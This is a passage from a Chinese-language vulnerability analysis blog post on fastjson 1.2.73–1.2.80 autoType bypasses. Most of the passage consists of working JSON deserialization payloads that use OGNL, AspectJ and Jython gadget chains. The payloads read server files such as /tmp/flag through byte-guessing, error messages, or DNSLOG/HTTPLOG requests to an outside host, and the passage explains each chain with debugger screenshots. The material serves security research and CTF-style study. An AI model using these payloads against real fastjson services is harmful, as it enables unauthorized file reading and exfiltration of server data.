class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">[&#123;</span><br><span class="line">  <span class="attr">&quot;a&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;ognl.OgnlException&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;, &#123;</span><br><span class="line">  <span class="attr">&quot;b&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">          &#123;</span><br><span class="line">              &quot;@type&quot;: &quot;java.lang.String&quot;</span><br><span class="line">              &quot;@type&quot;: &quot;ognl.OgnlException&quot;,</span><br><span class="line">              &quot;_evaluation&quot;: &quot;&quot;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="attr">&quot;c&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;ognl.Evaluation&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;node&quot;</span>: &#123;</span><br><span class="line">              <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;ognl.ASTMethod&quot;</span>,</span><br><span class="line">              <span class="attr">&quot;p&quot;</span>: &#123;</span><br><span class="line">                  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;ognl.OgnlParser&quot;</span>,</span><br><span class="line">                  <span class="attr">&quot;stream&quot;</span>: &#123;</span><br><span class="line">                      <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span>,</span><br><span class="line">                      <span class="attr">&quot;delegate&quot;</span>: &#123;</span><br><span class="line">                          <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">                          <span class="attr">&quot;reader&quot;</span>: &#123;</span><br><span class="line">                              <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span>,</span><br><span class="line">                              <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;file:///tmp/flag&quot;</span></span><br><span class="line">                          &#125;,</span><br><span class="line">                          <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                          <span class="attr">&quot;bufferSize&quot;</span>: <span class="number">1024</span></span><br><span class="line">                      &#125;,</span><br><span class="line">                      <span class="attr">&quot;boms&quot;</span>: [&#123;</span><br><span class="line">                          <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span>,</span><br><span class="line">                          <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                          <span class="attr">&quot;bytes&quot;</span>: [</span><br><span class="line">                              <span class="number">103</span></span><br><span class="line">                          ]</span><br><span class="line">                      &#125;]</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="attr">&quot;d&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$[2].c.node.p.stream&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123; </span><br><span class="line">      <span class="attr">&quot;e&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$[3].d.bOM.bytes&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;,&#123;</span><br><span class="line">      &quot;f&quot;: &#123;</span><br><span class="line">          &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">          &quot;node&quot;: &#123;</span><br><span class="line">              &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">              &quot;p&quot;: &#123;</span><br><span class="line">                  &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span class="line">                  &quot;stream&quot;: &#123;</span><br><span class="line">                      &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                      &quot;delegate&quot;: &#123;</span><br><span class="line">                          &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                          &quot;reader&quot;: &#123;</span><br><span class="line">                              &quot;@type&quot;: &quot;org.apache.commons.io.input.CharSequenceReader&quot;,</span><br><span class="line">                              &quot;charSequence&quot;: &#123;</span><br><span class="line">                                  &quot;@type&quot;: &quot;java.lang.String&quot; &#123;</span><br><span class="line">                                      &quot;$ref&quot;: &quot;$[4].e&quot;</span><br><span class="line">                                  &#125;,</span><br><span class="line">                                  &quot;start&quot;: 0,</span><br><span class="line">                                  &quot;end&quot;: 0</span><br><span class="line">                              &#125;,</span><br><span class="line">                              &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                              &quot;bufferSize&quot;: 1024</span><br><span class="line">                          &#125;,</span><br><span class="line">                          &quot;boms&quot;: [&#123;</span><br><span class="line">                              &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,</span><br><span class="line">                              &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                              &quot;bytes&quot;: [1]</span><br><span class="line">                          &#125;]</span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;,&#123;</span><br><span class="line">      &quot;g&quot;: &#123;</span><br><span class="line">          &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">          &quot;node&quot;: &#123;</span><br><span class="line">              &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">              &quot;p&quot;: &#123;</span><br><span class="line">                  &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span class="line">                  &quot;stream&quot;: &#123;</span><br><span class="line">                      &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                      &quot;delegate&quot;: &#123;</span><br><span class="line">                          &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                          &quot;reader&quot;: &#123;</span><br><span class="line">                              &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,</span><br><span class="line">                              &quot;url&quot;: &quot;http://error.DNSLOG&quot;</span><br><span class="line">                          &#125;,</span><br><span class="line">                          &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                          &quot;bufferSize&quot;: 1024</span><br><span class="line">                      &#125;,</span><br><span class="line">                      &quot;boms&quot;: [&#123;</span><br><span class="line">                          &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,</span><br><span class="line">                          &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                          &quot;bytes&quot;: [</span><br><span class="line">                              <span class="number">49</span></span><br><span class="line">                          ]</span><br><span class="line">                      &#125;]</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="attr">&quot;h&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$[6].g.node.p.stream&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="attr">&quot;i&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span>: <span class="string">&quot;$[7].h.bOM.bytes&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;]</span><br></pre></td></tr></table></figure><p><code>g</code>节点下的URLReader中url参数可以指定为dnslog或httplog用于观察<br><strong>bytes中字节数组和文件内容不一致</strong></p><ul><li>返回<code>java.lang.ClassCastException: com.alibaba.fastjson.JSONArray cannot be cast to com.alibaba.fastjson.JSONObject</code>异常</li><li>触发URLReader的url请求，接收到DNSLOG/HTTPLOG</li></ul><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/34.png" alt="34" style="zoom:50%;" /></div>**bytes中字节数组和文件内容一致**<ul><li>返回<code>com.alibaba.fastjson.JSONException: set property error, org.apache.commons.io.input.CharSequenceReader#charSequence</code>异常</li><li>DNSLOG/HTTPLOG没有请求</li></ul><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/35.png" alt="35" style="zoom:50%;" /></div><h3 id="3-6-aspectjtools利用链"><a href="#3-6-aspectjtools利用链" class="headerlink" title="3.6 aspectjtools利用链"></a>3.6 aspectjtools利用链</h3><p><strong>适用版本：1.2.73~1.2.80</strong><br>AspectJ用于aop开发，spring的业务中经常使用，帮助面向切面编程，因此这个依赖也可能是经常出现的</p><h4 id="3-6-1-回显文件读取"><a href="#3-6-1-回显文件读取" class="headerlink" title="3.6.1 回显文件读取"></a>3.6.1 回显文件读取</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;x&quot;</span>:&#123;</span><br><span class="line">       <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">       <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;y&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;java.lang.String&quot;</span><br><span class="line">                &quot;@type&quot;: &quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;,</span><br><span class="line">                &quot;newAnnotationProcessorUnits&quot;: [&#123;&#125;]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &quot;z&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;,</span><br><span class="line">        &quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,</span><br><span class="line">        &quot;fileName&quot;:&quot;/tmp/flag&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/36.png" alt="36" style="zoom:50%;" /></div><h4 id="3-6-2-报错回显读取文件"><a href="#3-6-2-报错回显读取文件" class="headerlink" title="3.6.2 报错回显读取文件"></a>3.6.2 报错回显读取文件</h4><p>利用3.6.1 读取文件后，<code>org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit</code>类加入<code>mappings</code>缓存中，此时可以绕过autoType使用，结合Character产生的报错，回显文件内容</p><blockquote><p>注意，直接使用下面的poc，需要先试用3.6.1 将类加入mappings中</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Character&quot;</span>&#123;</span><br><span class="line">        <span class="attr">&quot;c&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;fileName&quot;</span>: <span class="string">&quot;/tmp/flag&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/37.png" alt="37" style="zoom:50%;" /></div><h4 id="3-6-3-注入依赖-报错回显文件"><a href="#3-6-3-注入依赖-报错回显文件" class="headerlink" title="3.6.3 注入依赖+报错回显文件"></a>3.6.3 注入依赖+报错回显文件</h4><p>或者直接组合一个报错回显的利用链</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;x&quot;</span>:&#123;</span><br><span class="line">       <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">       <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;y&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;java.lang.String&quot;</span><br><span class="line">                &quot;@type&quot;: &quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;,</span><br><span class="line">                &quot;newAnnotationProcessorUnits&quot;: [&#123;&#125;]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &quot;z&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;,</span><br><span class="line">        &quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,</span><br><span class="line">        &quot;fileName&quot;:&quot;/tmp/flag&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">    &quot;u&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Character&quot;&#123;</span><br><span class="line">            &quot;c&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,</span><br><span class="line">                &quot;fileName&quot;: &quot;/tmp/flag&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/38.png" alt="38" style="zoom:50%;" /></div><h4 id="3-6-4-DNSLOG-HTTPLOG读取文件"><a href="#3-6-4-DNSLOG-HTTPLOG读取文件" class="headerlink" title="3.6.4 DNSLOG/HTTPLOG读取文件"></a>3.6.4 DNSLOG/HTTPLOG读取文件</h4><p>由于拼接DNSLOG包含{}等一些特殊符号，测试在windows上不能使用，这个没有验证</p><ul><li><strong>使用3.6.1 注入依赖类 org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit</strong></li><li>发送<code>poc</code>结合<code>httplog</code>；注意HTTPLOG的这种方式，遇到<code>#</code>字符就会阶段，后面的内容不显示<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;x&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;ognl.OgnlException&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;y&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;java.lang.String&quot; &quot;@type&quot;: &quot;ognl.OgnlException&quot;,</span><br><span class="line">                &quot;_evaluation&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;z&quot;: &#123;</span><br><span class="line">            &quot;@type&quot;: &quot;ognl.Evaluation&quot;,</span><br><span class="line">            &quot;node&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;ognl.ASTMethod&quot;,</span><br><span class="line">                &quot;p&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;ognl.OgnlParser&quot;,</span><br><span class="line">                    &quot;stream&quot;: &#123;</span><br><span class="line">                        &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,</span><br><span class="line">                        &quot;delegate&quot;: &#123;</span><br><span class="line">                            &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,</span><br><span class="line">                            &quot;reader&quot;: &#123;</span><br><span class="line">                                &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,</span><br><span class="line">                                &quot;url&quot;: &#123;</span><br><span class="line">                                    &quot;@type&quot;: &quot;java.lang.String&quot;&#123;</span><br><span class="line">                                        &quot;@type&quot;: &quot;java.net.URL&quot;,</span><br><span class="line">                                        &quot;val&quot;: &#123;</span><br><span class="line">                                            &quot;@type&quot;: &quot;java.lang.String&quot;&#123;</span><br><span class="line">                                                &quot;@type&quot;: &quot;java.util.Locale&quot;,</span><br><span class="line">                                                &quot;val&quot;: &#123;</span><br><span class="line">                                                    &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">                                                    &#123;</span><br><span class="line">                                                        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.util.Locale&quot;</span>,</span><br><span class="line">                                                        <span class="attr">&quot;language&quot;</span>: <span class="string">&quot;http://127.0.0.1:8889/&quot;</span>,</span><br><span class="line">                                                        <span class="attr">&quot;country&quot;</span>: &#123;</span><br><span class="line">                                                            <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span>[</span><br><span class="line">                                                                &#123;</span><br><span class="line">                                                                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;</span>,</span><br><span class="line">                                                                    <span class="attr">&quot;fileName&quot;</span>: <span class="string">&quot;/tmp/flag&quot;</span></span><br><span class="line">                                                                &#125;</span><br><span class="line">                                                            ]</span><br><span class="line">                                                        &#125;</span><br><span class="line">                                                    &#125;</span><br><span class="line">                                                &#125;</span><br><span class="line">                                            &#125;,</span><br><span class="line">                                            &quot;charsetName&quot;: &quot;UTF-8&quot;,</span><br><span class="line">                                            &quot;bufferSize&quot;: 1024</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        &quot;boms&quot;: [</span><br><span class="line">                                            &#123;</span><br><span class="line">                                                <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span>,</span><br><span class="line">                                                <span class="attr">&quot;charsetName&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">                                                <span class="attr">&quot;bytes&quot;</span>: [</span><br><span class="line">                                                    <span class="number">1</span></span><br><span class="line">                                                ]</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        ]</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        &quot;u&quot;: &#123;</span><br><span class="line">                            &quot;$ref&quot;: &quot;$.z.node.p.stream&quot;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/39.png" alt="39" style="zoom:50%;" /></div></li></ul><h2 id="4-Poc的版本适配补充"><a href="#4-Poc的版本适配补充" class="headerlink" title="4. Poc的版本适配补充"></a>4. Poc的版本适配补充</h2><h3 id="4-1-JPython"><a href="#4-1-JPython" class="headerlink" title="4.1 JPython"></a>4.1 JPython</h3><h4 id="4-1-1-低版本运行3-3-3中第一个poc"><a href="#4-1-1-低版本运行3-3-3中第一个poc" class="headerlink" title="4.1.1 低版本运行3.3.3中第一个poc"></a>4.1.1 低版本运行3.3.3中第一个poc</h4><p>在网上的文章中，JPython的相关利用链，有说是1.2.76 ~ 1.2.80版本的，也有一些poc可以在低版本运行<br>在<code>1.2.72</code>版本中，使用3.3.3 中的Poc，抛出异常：<code>set property error, org.python.antlr.ParseException#type</code><br>原因是在<code>org.python.antlr.ParseException#setType</code>赋值时，因为参数类型不对报错了</p><h4 id="4-1-2-改良的poc"><a href="#4-1-2-改良的poc" class="headerlink" title="4.1.2 改良的poc"></a>4.1.2 改良的poc</h4><p>这个poc也是从网上看到的，下方poc是通过<code>setType</code>来将<code>org.python.core.PyObject</code>类生成一个反序列化工具类并加入到<code>ParserConfig.deserializers</code>中的部分</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&quot;a&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;java.lang.Exception&quot;,</span><br><span class="line">    &quot;@type&quot;: &quot;org.python.antlr.ParseException&quot;,</span><br><span class="line">&#125;,</span><br><span class="line">&quot;b&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">    &quot;val&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.String&quot;&#123;</span><br><span class="line">            &quot;@type&quot;: &quot;java.util.Locale&quot;,</span><br><span class="line">            &quot;val&quot;: &#123;</span><br><span class="line">                &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.python.antlr.ParseException&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;type&quot;</span>: &#123;&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>java.lang.Class</code>的<code>val</code>参数是<code>java.lang.String</code>类型，使用<code>StringCodec</code>工具类来解析；由于紧跟着是<code>&#123;</code>，因此又使用DefaultJSONParser解析后面的<code>java.util.Locale</code></p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/40.png" alt="40" style="zoom:50%;" /></div><p><code>java.util.Locale</code>类使用的<code>MiscCodec</code></p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/41.png" alt="41" style="zoom:50%;" /></div><p>判断字段中是否是包含@type</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/42.png" alt="42" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/43.png" alt="43" style="zoom:50%;" /></div><p>此时使用<code>javaBeanDeser</code>来创建map中的实例</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/44.png" alt="44" style="zoom:50%;" /></div><p>如图在对<code>type</code>参数复制时，使用<code>TypeUtils.cast</code>将Type的<code>JSONObject</code>类型转换为需要的<code>PyObject</code>类型</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/45.png" alt="45" style="zoom:50%;" /></div><p>此时在<code>ParseConfig.deserializer</code>中已经有<code>org.python.core.PyObject</code>的缓存了</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/46.png" alt="46" style="zoom:50%;" /></div><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/47.png" alt="47" style="zoom:50%;" /></div>而在之前的poc中，直接使用ThrowableDeserializer工具类进行反序列化解析字段时，直接将JSONObject类型的type拿来使用，导致异常<div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/48.png" alt="48" style="zoom:50%;" /></div><p>对比一下<code>1.2.76</code>版本，为什么可以直接使用<code>type: &#123;&#125;</code>进行赋值，如图在<code>ThrowableDeserializer</code>对字段进行反序列化的地方增加了一个<code>TypeUtils.cast</code>根据字段类型将字段进行类型转换，使得反序列化成功</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/49.png" alt="49" style="zoom:50%;" /></div><h3 id="4-2-其他利用链"><a href="#4-2-其他利用链" class="headerlink" title="4.2 其他利用链"></a>4.2 其他利用链</h3><p>其他利用链，比如groovy中，<code>CompilationFailedException</code>没有无参构造方法，在<code>JavaBeanDeserializer</code>中，使用`creatorConstructor</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/50.png" alt="50" style="zoom:50%;" /></div><p>对构造方法进行赋值，使用参数时，并没有调用<code>Type.cast</code>方法；对应类并没有生成对应的解析类，无法绕过<code>autoType</code>的检测</p><div align=center><img src="/img/fastjson 1.2.73-12.80漏洞分析/51.png" alt="51" style="zoom:50%;" /></div><p>其他的poc对应的版本，在每个大标题开头标注了~</p>]]></content>
      
      
      <categories>
          
          <category> 攻防研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
